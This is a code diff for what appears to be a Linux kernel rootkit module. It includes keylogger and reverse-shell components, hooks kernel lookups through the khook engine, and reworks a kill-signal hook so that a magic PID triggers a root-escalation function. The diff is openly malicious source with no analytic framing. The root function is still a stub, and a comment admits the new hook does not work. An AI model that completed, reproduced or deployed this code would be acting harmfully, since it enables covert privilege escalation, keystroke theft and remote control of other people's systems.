@@ -10,7 +10,12 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/timer.h>
+#include <linux/threads.h>
 #include <linux/syscalls.h>
+#include <linux/sched.h>
+#include <linux/pid.h>
+#include <linux/cred.h>
+#include <linux/unistd.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -47,7 +52,7 @@ typedef struct commands {
  */
 
 #define POLLING_INTERVAL 1500
-#define ROOT_PRIV_ESC_MAGIC 65535 // Highest PID on a 64-bit OS. TODO: Make 32/64 compat.
+#define ROOT_PRIV_ESC_MAGIC PID_MAX_DEFAULT // Highest PID on a 64-bit OS. TODO: Make 32/64 compat.
 static _timer polling_timer;
 struct commands cmds;
 
@@ -76,7 +81,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  * Forward declarations
  */
 
-static long get_root();
+static long get_root(void);
 static void poll_for_commands(unsigned long data);
 
 /**
@@ -163,18 +168,20 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 /**
  * Drops the current user into a root shell.
  */
-static long get_root() {
+static long get_root(void) {
 	printk(KERN_EMERG "One root coming right up.");
 	// TODO
 	return 0;
 }
 
-KHOOK(sys_kill);
-static long khook_sys_kill(pid_t pid, int sig) {
-	if (pid == ROOT_PRIV_ESC_MAGIC) {
+// BUG: COMPILES BUT DOESN'T HOOK KILL.
+KHOOK(kill_pid);
+static int khook_kill_pid(struct pid *pid, int sig, int priv) {
+	printk("ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
+	if (pid->numbers->nr == ROOT_PRIV_ESC_MAGIC) {
 		return get_root();
 	} else {
-		return KHOOK_ORIGIN(sys_kill, pid, sig);
+		return KHOOK_ORIGIN(kill_pid, pid, sig, priv);
 	}
 }
 
